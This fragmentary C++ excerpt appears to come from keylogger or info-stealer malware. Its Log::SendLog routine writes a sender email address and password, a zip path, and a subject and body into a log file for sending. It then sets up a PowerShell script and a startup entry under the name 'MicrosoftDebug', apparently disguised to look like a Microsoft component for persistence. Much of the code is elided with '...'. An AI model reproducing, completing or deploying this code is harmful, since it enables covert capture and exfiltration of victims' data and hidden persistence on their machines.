...
void createLogFile(const std::string& filename, const std::string& line1, const std::string& line2, const std::string& line3, const std::string& line4, const std::string& line5) {
...
void Log::SendLog() {
	...
	Filename += ".log";
	fullPath += "\\" + Filename;
	createLogFile(fullPath, SendersEmail, SendersPsw, ZipPath, LogSubject, LogBody);					 //if you want to not zip the file, change to "ZipPath" to "log"
	...
	Powershell += "\\MicrosoftDebug\\PSScript";
	Powershell += std::to_string(GetTickCount());
	Powershell += ".PS1";
	std::string PSStartup = "MicrosoftDebug";
